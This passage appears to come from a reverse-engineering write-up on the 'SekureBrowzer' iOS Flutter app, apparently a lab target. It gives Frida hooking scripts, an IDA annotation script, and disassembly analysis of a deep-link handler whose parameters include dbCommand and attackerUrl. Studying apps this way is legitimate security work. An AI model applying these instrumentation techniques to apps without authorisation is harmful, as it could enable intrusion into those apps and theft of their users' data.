var msgSend_id_id = new NativeFunction(Module.getGlobalExportByName('objc_msgSend'), 'pointer', ['pointer', 'pointer', 'pointer']);
var msgSend_id = new NativeFunction(Module.getGlobalExportByName('objc_msgSend'), 'pointer', ['pointer', 'pointer']);
var msgSend_bool_id = new NativeFunction(Module.getGlobalExportByName('objc_msgSend'), 'bool', ['pointer', 'pointer', 'pointer']);
var mainQueuePtr = Module.getGlobalExportByName('_dispatch_main_q');
var dispatch_async_f = new NativeFunction(Module.getGlobalExportByName('dispatch_async_f'), 'void', ['pointer', 'pointer', 'pointer']);

function ocClass(name) { return objc_getClass(Memory.allocUtf8String(name)); }
function ocSel(name) { return sel_registerName(Memory.allocUtf8String(name)); }

function dispatchOnMain(fn) {
  var cb = new NativeCallback(function () { fn(); }, 'void', ['pointer']);
  dispatchOnMain._keepAlive = dispatchOnMain._keepAlive || [];
  dispatchOnMain._keepAlive.push(cb);
  dispatch_async_f(mainQueuePtr, NULL, cb);
}

// ---------------------------------------------------------------------------
// rpc.exports -- called from the Python driver.
// ---------------------------------------------------------------------------
rpc.exports = {

  // Fires UIApplication openURL: on the main thread, same technique as
  // frida_driver.py/frida_driver_strcmp.py, so the driver can trigger
  // _handleDeepLink (and thus the anchor hook above) without needing the
  // user to tap anything on-device.
  openurl: function (urlString) {
    dispatchOnMain(function () {
      var nsstr = msgSend_id_cstr(ocClass('NSString'), ocSel('stringWithUTF8String:'), Memory.allocUtf8String(urlString));
      var nsurl = msgSend_id_id(ocClass('NSURL'), ocSel('URLWithString:'), nsstr);
      var sharedApp = msgSend_id(ocClass('UIApplication'), ocSel('sharedApplication'));
      var ok = msgSend_bool_id(sharedApp, ocSel('openURL:'), nsurl);
      log('openurl', urlString + ' -> openURL: returned ' + ok);
    });
    return 'dispatched ' + urlString;
  },

  // Step 0: driver calls this once, right after script.load(), with the
  // parsed dump.dart records (already offset-adjusted to absolute runtime
  // addresses -- see dump_pool_full_driver.py's build_symbol_table()).
  loadsymbols: function (symbolList) {
    appBase = Process.findModuleByName('App').base;
    for (var i = 0; i < symbolList.length; i++) {
      var s = symbolList[i];
      symbolsByAddr.push({
        method_name: s.method_name,
        class_name: s.class_name,
        library_url: s.library_url,
        rawOffsetHex: s.raw_offset_hex,
        addr: appBase.add(DART_ISOLATE_SNAPSHOT_INSTRUCTIONS_OFFSET).add(ptr(s.raw_offset_hex))
      });
    }
    symbolsByAddr.sort(function (a, b) { return a.addr.compare(b.addr); });
    log('symbols', 'loaded ' + symbolsByAddr.length + ' symbol records, sorted by address');

    installAnchorHook();
  },

  // Step 1 (driver polls/calls this after triggering a deep link): has the
  // anchor fired yet?
  ispoolready: function () {
    return poolBase !== null;
  },

  // Step 2: full raw pool walk + cross-ref join. Returns everything as one
  // array -- for POOL_SCAN_MAX_BYTES=0x20000 (16384 slots) this is a lot of
  // JSON; the driver writes it straight to disk rather than printing it.
  dumpandcrossref: function () {
    if (poolBase === null) {
      return { error: 'pool base (X27) not captured yet -- trigger a deep link first (see driver)' };
    }

    buildCrossRefIndex();

    log('dump', 'walking pool slots 0x0 .. 0x' + POOL_SCAN_MAX_BYTES.toString(16) +
      ' from base ' + poolBase);

    var results = [];
    var counts = { smi: 0, string: 0, other: 0, invalid: 0 };

    for (var off = 0; off < POOL_SCAN_MAX_BYTES; off += 8) {
      var slotAddr;
      var raw;
      try {
        slotAddr = poolBase.add(off);
        raw = slotAddr.readPointer();
      } catch (e) {
        continue; // unmapped -- silently skip, don't pollute output
      }

      var decoded = decodeSlot(raw);
      counts[decoded.kind] = (counts[decoded.kind] || 0) + 1;

      // Skip pure noise (Smis that are almost certainly not meaningful
      // pool constants, and unreadable slots) to keep the output focused --
      // strings and "other objects" are always kept since those are what
      // "dump every string and object" means; Smis are kept too but you'll
      // see a LOT of them (array lengths, small ints embedded by the
      // compiler) -- filter counts.smi results downstream if noisy.
      if (decoded.kind === 'invalid') continue;

      var owners = poolOffsetOwners[String(off)] || [];

      results.push({
        offset_hex: '0x' + off.toString(16),
        kind: decoded.kind,
        value: decoded.value !== undefined ? decoded.value : undefined,
        display: decoded.display,
        owners: owners.map(function (o) {
          return o.class_name + '.' + o.method_name + ' (' + o.library_url + ')';
        })
      });
    }

    log('dump', 'done: ' + results.length + ' non-garbage slots kept (raw counts: ' +
      JSON.stringify(counts) + ')');

    return { poolBase: poolBase.toString(), counts: counts, slots: results };
  }
};
```

```python
$ python3 dump_pool_full_driver.py
[*] parsing dump.dart
[*] parsed 12570 dump.dart records
[*] attached to running process, pid 5934
[anchor] hooking _BrowserScreenState._handleDeepLink @ 0x10617eec8 to capture X27
[*] triggering deep link to fire the anchor hook: sekurebrowzer://anyhost?url=https://example.com
[anchor] captured live pool base X27 = 0xbed480080
[*] pool base captured. Running full walk + cross-reference...
[xref] cross-reference index built: 12570 functions scanned, 141015 pool-load sites found, 3401 unique offsets with an owner
[dump] walking pool slots 0x0 .. 0x20000 from base 0xbed480080
[dump] done: 14692 non-garbage slots kept (raw counts: {"smi":407,"string":5121,"other":9164,"invalid":1692})
[*] wrote 5528 slots to pool_full_dump.json (dropped 9164 slot(s) outside ['smi', 'string'])
```

A slice of the output, `pool_full_dump.json`:

```json
{
    "offset_hex": "0xfbe0",
    "kind": "string",
    "value": "dbCommand",
    "display": "\"dbCommand\" (OneByteString, len=9)",
    "owners": []
},
{
    "offset_hex": "0xfbf8",
    "kind": "string",
    "value": "attackerUrl",
    "display": "\"attackerUrl\" (OneByteString, len=11)",
    "owners": []
}
```

Then, the last step is getting these back into IDA so the disassembly reads like normal code from here on. A companion script, `annotate_pool_full_dump.py`, does two things:

1. Pushes each resolved string as an EOL comment at the exact `[X27, #offset]` load site.
2. Solves the "there's no fixed address to xref" problem by manufacturing one: it carves out a synthetic data segment, `POOL_FULL`, in unused space past the end of the binary's real segments, writes one addressable, named location per distinct pool offset (`poolfull_0x<offset>`, holding the decoded bytes), and adds a real data xref from every matching load site to it. `poolfull_0x<offset>` isn't a real on-device address — it's a bookkeeping location this script invented — but it means `Ctrl-X` on it now lists every real instruction in the binary that loads that constant, instead of that being a grep exercise.

```python
# annotate_pool_full_dump.py
import argparse
import json
import os
import re
import struct

import idautils
import idaapi
import idc
import ida_funcs
import ida_bytes
import ida_nalt
import ida_name
import ida_segment
import ida_xref
import ida_ida

DEFAULT_DUMP_JSON = os.path.join(
    os.path.dirname(os.path.abspath(__file__)), "..", "poc", "frida", "pool_full_dump.json"
)

SEGMENT_NAME = "POOL_FULL"
TAG_PREFIX_KNOWN = "POOLFULL[X27]: "
MAX_DISPLAY_LEN = 160

# Same idiom regexes as xref_all_pool_strings.py -- kept duplicated rather
# than imported, since these are meant to be standalone `py_exec_file`
# scripts (see that file's own header for the same rationale).
RE_ADD_X27 = re.compile(
    r"ADD\s+(X\d{1,2}),\s*X27,\s*#(?:0x)?([0-9A-Fa-f]+),\s*LSL#12", re.IGNORECASE
)
RE_LDR_X27_DIRECT = re.compile(
    r"LDR\w*\s+X\d{1,2},\s*\[X27,\s*#(?:0x)?([0-9A-Fa-f]+)\]", re.IGNORECASE
)
RE_LDR_REG_OFF = re.compile(
    r"LDR\w*\s+X\d{1,2},\s*\[(X\d{1,2}),\s*#(?:0x)?([0-9A-Fa-f]+)\]", re.IGNORECASE
)

_OWNER_RE = re.compile(r"^(.*?)\.(.*?)\s*\(.*\)$")


def safe_text(s, max_len=MAX_DISPLAY_LEN):
    v = str(s)
    if len(v) > max_len:
        v = v[:max_len] + "...(truncated)"
    return v.replace("\n", "\\n").replace("\r", "\\r")


def load_pool_full_table(path):
    """
    Returns {offset_int: {"kind": "smi"|"string", "value": str, "owners": [str, ...]}}.
    Silently re-filters to smi/string even though the driver already does
    this before writing the file -- defensive, in case an older/unfiltered
    pool_full_dump.json (from before the driver's smi/string filter was
    added) gets pointed at this script instead.
    """
    with open(path, "r", encoding="utf-8") as f:
        raw = json.load(f)

    table = {}
    for slot in raw.get("slots", []):
        if slot.get("kind") not in ("smi", "string"):
            continue
        off = int(slot["offset_hex"], 16)
        table[off] = {
            "kind": slot["kind"],
            "value": slot.get("value", ""),
            "owners": slot.get("owners", []),
        }
    return table


def parse_owner(owner_str):
    """
    "StorageManager.getAllScreenshotsAsJson (package:sekure_browzer/main.dart)"
    -> ("StorageManager", "getAllScreenshotsAsJson")
    Returns None if the string doesn't match the expected shape.
    """
    m = _OWNER_RE.match(owner_str)
    if not m:
        return None
    return m.group(1), m.group(2)


def resolve_owner_func_ea(class_name, method_name):    
    candidates = [
        "%s__%s" % (class_name, method_name),
    ]
    if class_name.startswith("_"):
        candidates.append("%s__%s" % (class_name[1:], method_name))
    candidates.append(method_name)  # bare fallback (identical-code-folded/global fns)

    for cand in candidates:
        ea = ida_name.get_name_ea(idaapi.BADADDR, cand)
        if ea != idaapi.BADADDR:
            return ea
    return idaapi.BADADDR


def build_scan_scope(pool_table, full_scan):
    """
    Returns (list_of_func_eas, unresolved_owner_pairs, offsets_with_no_owner).
    """
    if full_scan:
        return list(idautils.Functions()), [], []

    funcs = set()
    unresolved = []
    no_owner = []
    seen_pairs = set()

    for off, entry in pool_table.items():
        owners = entry["owners"]
        if not owners:
            no_owner.append(off)
            continue
        for owner_str in owners:
            parsed = parse_owner(owner_str)
            if not parsed:
                continue
            if parsed in seen_pairs:
                continue
            seen_pairs.add(parsed)
            class_name, method_name = parsed
            ea = resolve_owner_func_ea(class_name, method_name)
            if ea == idaapi.BADADDR:
                unresolved.append("%s.%s" % (class_name, method_name))
            else:
                f = ida_funcs.get_func(ea)
                if f:
                    funcs.add(f.start_ea)

    return list(funcs), unresolved, no_owner


def make_pool_full_segment(pool_table):
    """
    Creates a fresh POOL_FULL data segment sized exactly for pool_table's
    current contents, in unused address space past the end of the
    database's existing segments, and writes one entry per offset:
    decoded string bytes (NUL-terminated) for kind=="string", or an 8-byte
    little-endian value for kind=="smi". Returns {offset_int: ea}.

    Rebuilt from scratch every run rather than incrementally updated --
    simpler and correct as long as this script is re-run after every fresh
    pool_full_dump.json (the normal usage pattern), at the cost of not
    being a true no-op re-run like the comment-tag-based idempotency the
    sibling scripts use for THEIR annotations. The comments/xrefs this
    script adds elsewhere in the binary ARE tag-deduped/xref-deduped on
    re-run (see annotate_offset_hits below) -- only this segment's own
    contents are unconditionally rewritten.
    """
    old_seg = ida_segment.get_segm_by_name(SEGMENT_NAME)
    if old_seg:
        ida_segment.del_segm(old_seg.start_ea, ida_segment.SEGMOD_KILL)

    # Rough size estimate: strings up to ~512 chars (MAX_STRING_CHARS in
    # dump_pool_full.js) + NUL, Smis fixed at 8 bytes, all 8-byte aligned,
    # plus headroom.
    est_size = 0
    for entry in pool_table.values():
        if entry["kind"] == "string":
            est_size += ((len(entry["value"].encode("utf-8", "replace")) + 1 + 7) // 8) * 8
        else:
            est_size += 8
    est_size += 0x1000  # headroom

    base = (ida_ida.inf_get_max_ea() + 0x10000) & ~0xFFF
    seg_ea = None
    for attempt in range(8):
        candidate = base + attempt * 0x1000000
        ok = ida_segment.add_segm(0, candidate, candidate + est_size, SEGMENT_NAME, "DATA")
        if ok:
            seg_ea = candidate
            break
    if seg_ea is None:
        raise RuntimeError(
            "could not carve out a %d-byte scratch segment for %s after 8 attempts "
            "past 0x%X -- inspect the database's segment map manually" % (
                est_size, SEGMENT_NAME, base)
        )

    offset_to_ea = {}
    cursor = seg_ea
    for off in sorted(pool_table.keys()):
        entry = pool_table[off]
        ea = cursor
        if entry["kind"] == "string":
            data = entry["value"].encode("utf-8", "replace") + b"\x00"
            ida_bytes.patch_bytes(ea, data)
            ida_bytes.create_strlit(ea, len(data), ida_nalt.STRTYPE_C)
            cursor += ((len(data) + 7) // 8) * 8
        else:  # smi
            try:
                val = int(entry["value"]) & 0xFFFFFFFFFFFFFFFF
            except (TypeError, ValueError):
                val = 0
            ida_bytes.patch_bytes(ea, struct.pack("<Q", val))
            ida_bytes.create_data(ea, ida_bytes.FF_QWORD, 8, idaapi.BADADDR)
            cursor += 8

        name = "poolfull_0x%X" % off
        ida_name.set_name(ea, name, ida_name.SN_NOCHECK | ida_name.SN_FORCE)
        idaapi.set_cmt(
            ea,
            "Dart AOT pool offset 0x%X, kind=%s, value=%s (synthetic location, "
            "see annotate_pool_full_dump.py header)" % (
                off, entry["kind"], safe_text(entry["value"])),
            False,
        )
        offset_to_ea[off] = ea

    return offset_to_ea


def add_comment_tagged(ea, text):
    existing = idaapi.get_cmt(ea, False) or ""
    tag = TAG_PREFIX_KNOWN + text
    if tag in existing:
        return False
    newcmt = (existing + " | " + tag) if existing else tag
    idaapi.set_cmt(ea, newcmt, False)
    idaapi.set_cmt(ea, tag, True)
    return True


def add_dref_deduped(frm, to_ea):
    for x in idautils.XrefsFrom(frm):
        if not x.iscode and x.to == to_ea:
            return False
    ida_xref.add_dref(frm, to_ea, ida_xref.dr_R | ida_xref.XREF_USER)
    return True


def annotate_offset_hits(func_eas, pool_table, offset_to_ea):
    sites_seen = 0
    comments_added = 0
    comments_already = 0
    xrefs_added = 0
    xrefs_already = 0
    matched_offsets = set()

    for func_ea in func_eas:
        f = ida_funcs.get_func(func_ea)
        if not f:
            continue
        pending_add = {}
        for ea in idautils.Heads(f.start_ea, f.end_ea):
            disasm = idc.GetDisasm(ea)

            m = RE_ADD_X27.search(disasm)
            if m:
                reg, imm1 = m.group(1), int(m.group(2), 16)
                pending_add[reg] = imm1 << 12
                continue

            off = None
            m = RE_LDR_X27_DIRECT.search(disasm)
            if m:
                off = int(m.group(1), 16)
            else:
                m = RE_LDR_REG_OFF.search(disasm)
                if m:
                    reg, imm2 = m.group(1), int(m.group(2), 16)
                    if reg in pending_add:
                        off = pending_add.pop(reg) + imm2

            if off is None:
                continue

            entry = pool_table.get(off)
            if entry is None:
                continue

            sites_seen += 1
            matched_offsets.add(off)

            if entry["kind"] == "string":
                text = '"%s" (String)' % safe_text(entry["value"])
            else:
                text = "%s (Smi)" % entry["value"]
            text = "[X27+0x%X] %s" % (off, text)

            if add_comment_tagged(ea, text):
                comments_added += 1
            else:
                comments_already += 1

            if add_dref_deduped(ea, offset_to_ea[off]):
                xrefs_added += 1
            else:
                xrefs_already += 1

    return dict(
        sites_seen=sites_seen,
        comments_added=comments_added,
        comments_already_tagged=comments_already,
        xrefs_added=xrefs_added,
        xrefs_already_present=xrefs_already,
        distinct_offsets_matched=len(matched_offsets),
    )


def main():
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--dump-json", default=DEFAULT_DUMP_JSON)
    ap.add_argument("--full-scan", default=True, action="store_true",
                     help="Disassemble every function in the binary instead of only "
                          "resolved owner functions (slower, more complete).")
    # py_exec_file doesn't pass argv, so fall back to defaults cleanly there.
    args, _unknown = ap.parse_known_args([])

    dump_json_path = args.dump_json
    print("--- loading %s ---" % dump_json_path)
    pool_table = load_pool_full_table(dump_json_path)
    print("loaded %d smi/string pool offsets" % len(pool_table))
    if not pool_table:
        print("nothing to do (empty table) -- run dump_pool_full_driver.py against "
              "a live device first")
        return

    print("--- building synthetic POOL_FULL segment ---")
    offset_to_ea = make_pool_full_segment(pool_table)
    print("wrote %d entries to segment %s @ 0x%X" % (
        len(offset_to_ea), SEGMENT_NAME, min(offset_to_ea.values())))

    print("--- resolving owner functions (--full-scan=%s) ---" % args.full_scan)
    func_eas, unresolved_owners, no_owner_offsets = build_scan_scope(pool_table, args.full_scan)
    print("scan scope: %d function(s)%s" % (
        len(func_eas), " (full binary)" if args.full_scan else " (owner-resolved)"))
    if unresolved_owners:
        print("  %d owner name(s) did not resolve to a known IDA function "
              "(rename heuristic miss, or function not in this build's binary):" %
              len(unresolved_owners))
        for name in unresolved_owners[:20]:
            print("    " + name)
        if len(unresolved_owners) > 20:
            print("    ... and %d more" % (len(unresolved_owners) - 20))
    if no_owner_offsets:
        print("  %d offset(s) had no owners recorded in the dump.dart cross-ref at all "
              "(pass --full-scan to still try finding their load sites)" % len(no_owner_offsets))

    print("--- Pass B: scanning for [X27, #offset] loads matching the table ---")
    stats = annotate_offset_hits(func_eas, pool_table, offset_to_ea)
    print(
        "sites_seen=%(sites_seen)d distinct_offsets_matched=%(distinct_offsets_matched)d "
        "comments_added=%(comments_added)d comments_already_tagged=%(comments_already_tagged)d "
        "xrefs_added=%(xrefs_added)d xrefs_already_present=%(xrefs_already_present)d" % stats
    )
    unmatched = len(pool_table) - stats["distinct_offsets_matched"]
    if unmatched:
        print("%d table offset(s) were never found at a load site in the scanned scope "
              "-- widen with --full-scan, or they may belong to a function this build's "
              "dump.dart offset math doesn't cover (see this file's docstring)." % unmatched)


main()
```

```asm
POOL_FULL:000000000053FAC0 poolfull_0xFBE0 DCB "dbCommand",0       ; DATA XREF: _BrowserScreenState___handleDeepLink_19eec8+248↑r
POOL_FULL:000000000053FAD8 poolfull_0xFBF0 DCB "openGallery",0     ; DATA XREF: _BrowserScreenState___handleDeepLink_19eec8+2E0↑r
POOL_FULL:000000000053FAE8 poolfull_0xFBF8 DCB "attackerUrl",0     ; DATA XREF: _BrowserScreenState___handleDeepLink_19eec8+32C↑r
```

![Recovered inline string comment](https://lh3.googleusercontent.com/pw/AP1GczMi0wnUU1nz_8onm5WgfcfTyB9emZXchQLr3lPrheVR1t7zh-AA_n9P3ucP-Dmqqvl_az0XSWaBHtOzGxW4V_UPSPef7PQZXiuc94r59tUPUkMcpitHx5ri4N1iBfiN36xOwHLRlvU9jsu5ptyc7GKU=w2924-h1634-s-no-gm)
_**Figure: Recovered inline string comment**_

## Locating the deep-link dispatcher — `_handleDeepLink`

With symbols and pool comments in place, finding the entry point is a one-line search: the Strings window for `"Deep link received: "` turns up exactly one xref, straight into `_BrowserScreenState::_handleDeepLink` (IDA address `0x19eec8` — `dump.dart`'s raw offset `0x190608` plus `_kDartIsolateSnapshotInstructions`'s base `0xe8c0`, the same base every offset in this write-up gets resolved against).

```asm
__text:000000000019EEC8 _BrowserScreenState___handleDeepLink_19eec8
...
__text:000000000019EF88                 LDUR            X2, [X29,#-0x10]
__text:000000000019EF8C                 LDUR            X0, [X2,#-1]
__text:000000000019EF90                 UBFX            X0, X0, #0xC, #0x14
__text:000000000019EF94                 MOV             X1, X2
__text:000000000019EF98                 SUB             X30, X0, #0xFF4
__text:000000000019EF9C                 LDR             X30, [X21,X30,LSL#3]
__text:000000000019EFA0                 BLR             X30
__text:000000000019EFA4                 LDUR            X1, [X0,#-1]
__text:000000000019EFA8                 UBFX            X1, X1, #0xC, #0x14
__text:000000000019EFAC                 ADD             X16, X27, #0xC,LSL#12
__text:000000000019EFB0                 LDR             X16, [X16,#0x238] ; POOLFULL[X27]: [X27+0xC238] "sekurebrowzer" (String)
__text:000000000019EFB4                 STP             X16, X0, [X15]
__text:000000000019EFB8                 MOV             X0, X1
__text:000000000019EFBC                 MOV             X30, X0
__text:000000000019EFC0                 LDR             X30, [X21,X30,LSL#3]
__text:000000000019EFC4                 BLR             X30
__text:000000000019EFC8                 TBNZ            W0, #4, loc_19F800
__text:000000000019EFCC                 LDUR            X3, [X29,#-8]
__text:000000000019EFD0                 LDUR            X2, [X29,#-0x10]
__text:000000000019EFD4                 LDUR            X4, [X29,#-0x18]
__text:000000000019EFD8                 LDUR            X0, [X2,#-1]
__text:000000000019EFDC                 UBFX            X0, X0, #0xC, #0x14
__text:000000000019EFE0                 MOV             X1, X2
__text:000000000019EFE4                 SUB             X30, X0, #0xFF0
__text:000000000019EFE8                 LDR             X30, [X21,X30,LSL#3]
__text:000000000019EFEC                 BLR             X30
__text:000000000019EFF0                 LDUR            X1, [X0,#-1]
__text:000000000019EFF4                 UBFX            X1, X1, #0xC, #0x14
__text:000000000019EFF8                 MOV             X16, X0
__text:000000000019EFFC                 MOV             X0, X1
__text:000000000019F000                 MOV             X1, X16
__text:000000000019F004                 ADD             X2, X27, #0xD,LSL#12
__text:000000000019F008                 LDR             X2, [X2,#0x488] ; POOLFULL[X27]: [X27+0xD488] "url" (String)
__text:000000000019F00C                 SUB             X30, X0, #1,LSL#12
__text:000000000019F010                 LDR             X30, [X21,X30,LSL#3]
__text:000000000019F014                 BLR             X30
__text:000000000019F018                 MOV             X3, X0
__text:000000000019F01C                 LDUR            X2, [X29,#-0x10]
__text:000000000019F020                 STUR            X3, [X29,#-0x20]
__text:000000000019F024                 LDUR            X0, [X2,#-1]
__text:000000000019F028                 UBFX            X0, X0, #0xC, #0x14
__text:000000000019F02C                 MOV             X1, X2
__text:000000000019F030                 SUB             X30, X0, #0xFF0
__text:000000000019F034                 LDR             X30, [X21,X30,LSL#3]
__text:000000000019F038                 BLR             X30
__text:000000000019F03C                 LDUR            X1, [X0,#-1]
__text:000000000019F040                 UBFX            X1, X1, #0xC, #0x14
__text:000000000019F044                 MOV             X16, X0
__text:000000000019F048                 MOV             X0, X1
__text:000000000019F04C                 MOV             X1, X16
__text:000000000019F050                 ADD             X2, X27, #0xF,LSL#12
__text:000000000019F054                 LDR             X2, [X2,#0x400] ; POOLFULL[X27]: [X27+0xF400] "takeScreenshot" (String)
__text:000000000019F058                 SUB             X30, X0, #1,LSL#12
__text:000000000019F05C                 LDR             X30, [X21,X30,LSL#3]
__text:000000000019F060                 BLR             X30
__text:000000000019F064                 MOV             X3, X0
__text:000000000019F068                 LDUR            X2, [X29,#-0x10]
__text:000000000019F06C                 STUR            X3, [X29,#-0x28]
__text:000000000019F070                 LDUR            X0, [X2,#-1]
__text:000000000019F074                 UBFX            X0, X0, #0xC, #0x14
__text:000000000019F078                 MOV             X1, X2
...
```

### Stack-slot map (verified against `STUR`/`LDUR` on `X29`, not guessed)

Dart AOT reuses stack slots aggressively once an SSA value's lifetime ends, so the *same offset* holds different things in different regions — that reuse is the main reason a quick skim looks like dead code. The mapping below is the slot each of the seven `Uri.queryParameters[...]` values lives in for the region where it is actually read back and branched on:

| Slot (`[X29,#-N]`) | Query param | First written | Read back at |
|---|---|---|---|
| `-0x20` | `url` | `0x19f020` | `0x19f4e4`+ (presence check), `0x19f61c`/`0x19f674` (navigation) |
| `-0x28` | `takeScreenshot` | `0x19f06c` | `0x19f690` (`== "true"`) |
| `-0x30` | `execute` | `0x19f0b8` | `0x19f738` (`!= null`) |
| `-0x38` | `dbCommand` | `0x19f128` | `0x19f4bc` (`!= null`, the export gate) |
| `-0x40` | `dbId` | `0x19f174` | `0x19f4c8` (passed to `_processDataCommand`) |
| `-0x48` | `openGallery` | `0x19f1c0` | `0x19f45c`/`0x19f468` (`== "true"`, checked **first**) |
| `-0x50` | `attackerUrl` | `0x19f20c` | `0x19f4cc` (passed to `_processDataCommand`) |

All these are read via the same idiom, twice per key: `uri.queryParameters` (a vtable call) followed by `Map.[]("<key>")` (a second vtable call), against the `Uri` object cached in `-0x10` (the deep link's target, the function's second argument) — meaning the pool loads at `0x19F008` (`"url"`), `0x19F054` (`"takeScreenshot"`), `0x19F0A0` (`"execute"`), `0x19F110` (`"dbCommand"`), `0x19F15C` (`"dbId"`), `0x19F1A8` (`"openGallery"`), and `0x19F1F4` (`"attackerUrl"`) are the **map keys**, not the values — each one is immediately consumed as the argument to a `Map.[]` lookup on the very next instruction. That's why they look like inert loads in isolation: the load itself does nothing observable, it's purely feeding the following `BLR`.

### Dart AOT dispatch-table calling convention — decoder key for the listing below

Every `uri.<getter>` / `map[key]` / `string == string` call in this function follows the same instructions idiom, and only the constant subtracted from the class id changes per selector:

```asm
LDUR X0, [Xrecv,#-1]        ; load receiver's header word (tagged ptr - 1)
UBFX X0, X0, #0xC, #0x14    ; extract class id = header bits [12:32)
SUB  X30, X0, #<selector>   ; index = class_id - <selector's constant>
LDR  X30, [X21, X30,LSL#3]  ; X21 = Dart AOT global dispatch table base;
                             ;  load code pointer for (class, selector)
BLR  X30                    ; call it
```

`X21` is the isolate's dispatch-table register (populated at isolate startup, same mechanism as the `X27` object-pool register — a runtime pointer, not a static address, which is why IDA can't statically resolve `BLR X30` targets either). The `<selector>` constant is fixed per call *site*, not per class — the same constant always means the same method, confirmed by its return
value and downstream use at every occurrence in this function:

| Selector constant | Meaning | Confirmed by |
|---|---|---|
| `0` (no `SUB`, class id used directly as index) | `String.operator==` | Return value immediately `TBNZ`-tested and gates the scheme/`"true"` checks; matches the shared `OneByteString`/`TwoByteString` equality routine (`0x258358`) |
| `0xFF4` (4084) | `Uri.scheme` getter | Result compared against pool string `"sekurebrowzer"` right after |
| `0xFF0` (4080) | `Uri.queryParameters` getter | Result is always immediately used as the receiver of the next `0x1000`-selector call (`Map.[]`) |
| `0x1000` (4096) | `Map<String,String>.operator[]` | Called with a query-param-name pool string as the RHS operand every time; result is the extracted value, spilled to a stack slot right after |
| `0xFDC` (4060) | `Uri.pathSegments` getter | Result only feeds the "Path segments: " log line, not a query param |

That table is a good working hypothesis, but it's still inference from call shape — not the same tier of evidence as reading the live table `X21` actually points to. Closing that gap means capturing `X21` on a real device and resolving an actual `(classId, selector)` pair through it.

The working hook sits at one `BLR`, the `uri.scheme` getter call, and reads three things before the call executes:

```asm
0x19ef88  LDUR X2, [X29,#-0x10]          ; X2 = uri
0x19ef8c  LDUR X0, [X2,#-1]              ; uri's header word
0x19ef90  UBFX X0, X0, #0xC, #0x14       ; X0 = uri's class id
0x19ef94  MOV  X1, X2                    ; X1 = receiver pointer (not the class id!)
0x19ef98  SUB  X30, X0, #0xFF4           ; reads X0, writes X30 — X0 survives
0x19ef9c  LDR  X30, [X21,X30,LSL#3]
0x19efa0  BLR  X30                       ; <-- single hook lands here
```

`this.context.x21` gives the dispatch table base. `this.context.x0` gives the receiver's class id (it survives because the `SUB` writes to `x30`, not `x0`). `this.context.lr` gives the CPU's own resolved call target — the ground truth to self-check against.

Run live against a physical device (pid 9938, USB-attached):

```python
#resolve_dispatch_table.py
import frida
import json
import os
import re
import sys
import time

TARGET = "com.eightksec.sekurebrowzer"
SCRIPT = os.path.join(os.path.dirname(__file__), "hook_dispatch_table.js")
DUMP_DART = os.path.join(os.path.dirname(__file__), "../..", "dump.dart")

# IDA address of _kDartIsolateSnapshotInstructions, i.e. dump.dart_offset + this base =
# the real IDA/file address every other tool in this repo already uses.
SNAPSHOT_INSTRUCTIONS_BASE = 0xE8C0


def load_dump_dart(path):    
    with open(path, "r") as f:
        text = f.read()

    decoder = json.JSONDecoder()
    by_offset = {}
    idx = 0
    n = len(text)
    count = 0
    while idx < n:
        while idx < n and text[idx] in " \t\r\n":
            idx += 1
        if idx >= n:
            break
        obj, end = decoder.raw_decode(text, idx)
        idx = end
        count += 1
        try:
            off = int(obj["offset"], 16)
        except (KeyError, TypeError, ValueError):
            continue
        by_offset.setdefault(off, []).append(obj)

    print("dump.dart: parsed %d records, %d unique offsets" % (count, len(by_offset)))
    return by_offset


def resolve(by_offset, file_offset_hex):
    """file_offset_hex: '0x19efa0'-style IDA address string (already
    module-base-normalized by the Frida script). Returns a display string."""
    if file_offset_hex is None:
        return "(target outside App module -- can't resolve)"
    ida_addr = int(file_offset_hex, 16)
    dart_offset = ida_addr - SNAPSHOT_INSTRUCTIONS_BASE
    if dart_offset < 0:
        return "(resolved address is below _kDartIsolateSnapshotInstructions -- not a Dart-compiled function; likely a VM stub)"
    records = by_offset.get(dart_offset)
    if not records:
        return "(no dump.dart symbol at offset 0x%x -- try widening the search or check the base constant)" % dart_offset
    return " | ".join(
        "%s.%s (%s)" % (r["class_name"], r["method_name"], r["library_url"])
        for r in records
    )


def main():
    by_offset = load_dump_dart(DUMP_DART)

    device = frida.get_usb_device(timeout=10)
    session = None
    for p in device.enumerate_processes():
        if p.name == "SekureBrowzer":
            session = device.attach(p.pid)
            print("attached to pid", p.pid)
            break
    if session is None:
        print("SekureBrowzer not running, spawning")
        pid = device.spawn([TARGET])
        session = device.attach(pid)
        device.resume(pid)
        time.sleep(1)

    with open(SCRIPT) as f:
        src = f.read()
    script = session.create_script(src)

    def on_message(message, data):
        if message.get("type") != "send":
            print("MSG:", message)
            return
        payload = message["payload"]
        tag = payload.get("tag")
        msg = payload.get("msg")
        if tag == "site":
            info = json.loads(msg)
            resolved = resolve(by_offset, info.get("fileOffset"))
            print("[site] %-32s classId=%-4s selector=%-6s indexMatch=%-5s -> %s" % (
                info["name"], info["classId"], info["selectorImm"],
                info["indexMatch"], resolved,
            ))
            if not info["indexMatch"]:
                print("        !! MISMATCH -- actualTarget=%s predictedViaIndex=%s"
                      % (info["actualTarget"], info["predictedViaIndex"]))
        else:
            print("[%s] %s" % (tag, msg))

    script.on("message", on_message)
    script.load()
    time.sleep(1)

    # A plain url-only link, no dbCommand/openGallery -- openGallery
    # and dbCommand would short-circuit before the takeScreenshot-selector-0
    # cross-check site).
    test_url = "sekurebrowzer://anyhost"
    try:
        r = script.exports_sync.openurl(test_url)
        print(">> sent:", test_url, "->", r)
    except Exception as e:
        print(">> error sending", test_url, e)
    time.sleep(3)

    # Example generalized-lookup calls, illustrating resolveIndex/sweepSelector
    # for selectors NOT hardcoded into hook_dispatch_table.js's six sites --
    # e.g. re-deriving the same "String.==" (selector 0) result independently
    # for OneByteString's own class id (0x5E / 94)
    try:
        r = script.exports_sync.resolveIndex(94, 0)
        print(">> resolveIndex(classId=94, selector=0):", r)
    except Exception as e:
        print(">> resolveIndex error:", e)

    print("DONE")


if __name__ == "__main__":
    sys.exit(main())
```

```bash
$ python3 resolve_dispatch_table.py
dump.dart: parsed 12570 records, 10976 unique offsets
attached to pid 9938
[hook] single dispatch-table capture site installed
>> sent: sekurebrowzer://anyhost -> dispatched sekurebrowzer://anyhost
[openurl] sekurebrowzer://anyhost -> openURL: returned 1
[ready] captured X21 (dispatch table base) = 0xdbd408000
[site] uri.scheme getter                classId=2826 selector=0xff4  indexMatch=True  -> _SimpleUri.scheme (dart:core)
